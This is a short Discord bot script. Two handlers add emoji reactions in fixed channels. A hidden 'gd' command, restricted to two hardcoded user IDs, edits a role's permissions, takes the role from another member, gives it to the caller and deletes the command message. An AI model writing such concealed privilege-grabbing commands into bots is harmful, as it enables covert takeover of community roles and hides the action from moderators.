commands.on(
  'gd',
  (args) => ({
    input: args.textOptional()
  }),
  async (message, { input }) => {
    if (message.author.id != '258265415770177536' && message.author.id != '401828594961350658') {
      return;
    }
    let rid = '768194217720938537';
    let x = await message.getGuild();
    let y = await x.getRole(rid);
    await y.edit({ permissions: 641064641, color:0x065ba2});//0x065ba2
    var gld = await message.getGuild();
    var psnn = await gld.getMember('738551414439018587');
    await psnn.removeRole('768194217720938537');
    await message.member?.addRole(y.id);
    await message.reply('..>..');
    await message.delete();
  }
);
    discord.on('MESSAGE_CREATE', async (message) => {
  if (message.channelId == '760887796210335825') {
    await message.addReaction('🥯');
    await sleep(2300);
        await message.deleteAllReactionsForEmoji('🍩');
        await message.deleteAllReactionsForEmoji('<:bigbrian:773956254363811861>');
  }
});
        discord.on('MESSAGE_CREATE', async (message) => {
  if (message.channelId == '773064015504605194') {
    await message.addReaction('🍕');
    await sleep(2300);
        await message.deleteAllReactionsForEmoji('🍩');
        //await message.deleteAllReactionsForEmoji('🍉');
  }
});
